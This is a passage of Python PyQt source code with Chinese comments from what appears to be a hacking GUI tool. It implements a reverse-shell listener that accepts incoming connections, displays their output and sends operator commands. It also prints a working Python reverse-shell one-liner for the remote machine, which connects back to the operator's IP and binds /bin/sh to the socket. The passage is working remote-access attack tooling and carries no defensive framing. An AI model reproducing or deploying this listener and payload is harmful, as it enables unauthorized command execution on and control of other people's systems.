            self.reverse_output.append(output)
            # 安全地滚动到底部
            self.reverse_output.moveCursor(QtGui.QTextCursor.End)

    def update_connection_status(self, success, message):
        """
        更新反向连接状态显示
        
        参数:
            success: 连接是否成功
            message: 状态消息
        """
        if hasattr(self, 'reverse_output'):
            if success:
                self.reverse_output.append(f"<span style='color:green'>{message}</span>")
            else:
                self.reverse_output.append(f"<span style='color:red'>{message}</span>")

    def send_reverse_command(self):
        """
        发送命令到反向连接的客户端
        
        功能:
        1. 获取输入框中的命令
        2. 清空输入框
        3. 将命令发送到反向连接的客户端
        """
        if hasattr(self, 'reverse_worker') and hasattr(self, 'reverse_input'):
            command = self.reverse_input.text()
            self.reverse_input.clear()
            self.reverse_worker.send_command(command)

    def close_reverse_connection(self):
        """
        关闭反向连接服务器
        
        功能:
        1. 停止反向连接工作线程
        2. 隐藏UI控件
        """
        # 关闭反向连接服务器
        if hasattr(self, 'reverse_worker'):
            self.reverse_worker.stop()
        
        # 关闭和隐藏UI元素
        if hasattr(self, 'reverse_output'):
            self.reverse_output.hide()
        if hasattr(self, 'reverse_input'):
            self.reverse_input.hide()
        if hasattr(self, 'reverse_send_button'):
            self.reverse_send_button.hide()
        if hasattr(self, 'reverse_close_button'):
            self.reverse_close_button.hide()

# 创建一个工作线程类来处理反向连接
class ReverseWorker(QObject):
    output_ready = pyqtSignal(str)
    connection_status = pyqtSignal(bool, str)
    finished = pyqtSignal()
    
    def __init__(self, port=9999):
        super().__init__()
        self.port = port
        self.running = False
        self.server = None
        self.client = None
    
    def start_server(self):
        try:
            class Handler(socketserver.BaseRequestHandler):
                def handle(self2):
                    nonlocal self
                    self.client = self2.request
                    client_address = self2.client_address[0]
                    self.output_ready.emit(f"收到来自 {client_address} 的连接\n")
                    
                    try:
                        while self.running:
                            data = self.client.recv(1024)
                            if not data:
                                break
                            
                            output = data.decode('utf-8', errors='ignore')
                            output = re.sub(r'\x1b\[\d*m', '', output)
                            self.output_ready.emit(output)
                            time.sleep(0.1)
                    except Exception as e:
                        self.output_ready.emit(f"连接错误: {str(e)}\n")
                    finally:
                        self.output_ready.emit(f"与 {client_address} 的连接已关闭\n")
            
            class Server(socketserver.ThreadingTCPServer):
                allow_reuse_address = True
            
            self.running = True
            self.connection_status.emit(True, f"启动反向连接服务器在端口 {self.port}")
            
            # 获取本机IP
            local_ip = socket.gethostbyname(socket.gethostname())
            self.output_ready.emit(f"启动反向连接服务器在端口 {self.port}...\n")
            self.output_ready.emit("等待远程主机连接...\n")
            self.output_ready.emit("在远程主机上运行以下命令以连接:\n")
            self.output_ready.emit(f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{local_ip}\",{self.port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n")
            
            self.server = Server(('0.0.0.0', self.port), Handler)
            self.server.serve_forever()
            
        except Exception as e:
            self.connection_status.emit(False, f"启动反向服务器错误: {e}")
        finally:
            self.finished.emit()
    
    def send_command(self, command):
        if self.client:
            try:
                self.client.sendall((command + "\n").encode())
            except Exception as e:
                self.output_ready.emit(f"发送命令失败: {str(e)}\n")
    
    def stop(self):
        self.running = False
        if self.server:
            self.server.shutdown()
            self.server.server_close()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    win = LoginWindow()
    sys.exit(app.exec_())

